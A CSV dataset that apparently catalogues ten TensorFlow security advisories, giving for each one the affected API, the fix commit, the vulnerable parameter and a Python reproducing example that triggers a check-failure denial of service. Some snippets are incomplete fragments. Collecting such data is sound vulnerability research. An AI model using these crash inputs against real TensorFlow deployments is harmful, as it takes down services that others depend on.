Library,Advisory Link,Commit,Parent Module,API,Anomaly,Reproducing Example,Vulnerable Parameter,Root cause 1,Root cause 2,Attack type
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9cr2-8pwr-fhfq,https://github.com/tensorflow/tensorflow/commit/f3f9cb38ecfe5a8a703f2c4a8fead434ef291713,tf.array_ops,tf.raw_ops.QuantizeAndDequantizeV3,Non scalar input,"import tensorflow as tf

signed_input = True
range_given = False
narrow_range = False
axis = -1
input = tf.constant(-3.5, shape=[1], dtype=tf.float32)
input_min = tf.constant(-3.5, shape=[1], dtype=tf.float32)
input_max = tf.constant(-3.5, shape=[1], dtype=tf.float32)
num_bits = tf.constant([], shape=[0], dtype=tf.int32)
tf.raw_ops.QuantizeAndDequantizeV3(input=input, input_min=input_min, input_max=input_max, num_bits=num_bits, signed_input=signed_input, range_given=range_given, narrow_range=narrow_range, axis=axis)",num_bits,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r26c-679w-mrjm,https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed,tf.quantization,tf.quantization.fake_quant_with_min_max_vars_gradient,Non scalar input,"import tensorflow as tf
import numpy as np 
arg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_1=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_2=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_3=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_4=8
arg_5=False
arg_6=''
tf.quantization.fake_quant_with_min_max_vars_gradient(gradients=arg_0, inputs=arg_1,
min=arg_2, max=arg_3, num_bits=arg_4, narrow_range=arg_5, name=arg_6)","min, max",N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mv8m-8x97-937q,https://github.com/tensorflow/tensorflow/commit/552bfced6ce4809db5f3ca305f60ff80dd40c5a3,tf.random,tf.random.gamma,Very large input argument,"import tensorflow as tf
arg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)
arg_1=tf.random.uniform(shape=(4, 4), dtype=tf.float64, maxval=None)
arg_2=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float64, maxval=None)
arg_3=tf.float64
arg_4=48
arg_5='None'
tf.random.gamma(shape=arg_0, alpha=arg_1, beta=arg_2, dtype=arg_3, seed=arg_4, name=arg_5)",shape,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cv2p-32v3-vhwq,https://github.com/tensorflow/tensorflow/commit/552bfced6ce4809db5f3ca305f60ff80dd40c5a3,tf.raw_ops,tf.raw_ops.RandomPoissonV2,Very large input argument,"import tensorflow as tf
arg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)
arg_1=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float32, maxval=None)
arg_2=0
arg_3=0
arg_4=tf.int32
arg_5=None
tf.raw_ops.RandomPoissonV2(shape=arg_0, rate=arg_1, seed=arg_2,
                           seed2=arg_3, dtype=arg_4, name=arg_5)","shape, rate",N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mh3m-62v7-68xg,https://github.com/tensorflow/tensorflow/commit/4419d10d576adefa36b0e0a9425d2569f7c0189f,tf.raw_ops,tf.raw_ops.Unbatch,Non scalar input,"import tensorflow as tf
import numpy as np
arg_0=tf.constant(value=np.random.random(size=(3, 3, 1)), dtype=tf.float64)
arg_1=tf.constant(value=np.random.randint(0,100,size=(3, 3, 1)), dtype=tf.int64)
arg_2=tf.constant(value=np.random.randint(0,100,size=(3, 3,  1)), dtype=tf.int64)
arg_3=47
arg_4=''
arg_5=''
tf.raw_ops.Unbatch(batched_tensor=arg_0, batch_index=arg_1, id=arg_2, 
                   timeout_micros=arg_3, container=arg_4, shared_name=arg_5)",id,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jqm7-m5q7-3hm5,https://github.com/tensorflow/tensorflow/commit/da0d65cdc1270038e72157ba35bf74b85d9bda11,tf.raw_ops,tf.raw_ops.DrawBoundingBoxes,Non float input,"import tensorflow as tf
import numpy as np
arg_0=tf.constant(value=np.random.random(size=(1, 3, 2, 3)), shape=(1, 3, 2, 3), dtype=tf.half)
arg_1=tf.constant(value=np.random.random(size=(1, 2, 4)), shape=(1, 2, 4), dtype=tf.float32)
arg_2=''
tf.raw_ops.DrawBoundingBoxes(images=arg_0, boxes=arg_1, name=arg_2)",boxes,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fqxc-pvf8-2w9v,https://github.com/tensorflow/tensorflow/commit/aed36912609fc07229b4d0a7b44f3f48efc00fd0,tf.raw_ops,tf.raw_ops.Eig,Bad input,arg_1=tf.complex128,Tout,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-37jf-mjv6-xfqw,https://github.com/tensorflow/tensorflow/commit/27a65a43cf763897fecfa5cdb5cc653fc5dd0346,tf.raw_ops,tf.raw_ops.Conv2DBackpropInput,Empty input,"np.ones([3, 1, 0, 3])",out_backprop,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qhw4-wwr7-gjc5,https://github.com/tensorflow/tensorflow/commit/c8ba76d48567aed347508e0552a257641931024d,tf.raw_ops,tf.raw_ops.EmptyTensorList,More than one dimension,"tf.ones(dtype=tf.int32, shape=[1, 0])",element_shape,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p7hr-f446-x6qf,https://github.com/tensorflow/tensorflow/commit/83dcb4dbfa094e33db084e97c4d0531a559e0ebf,tf.sparse,tf.sparse.cross,Non scalar input,"separator=tf.constant(['a', 'b']",separator,N.A,check failure,Denial of service
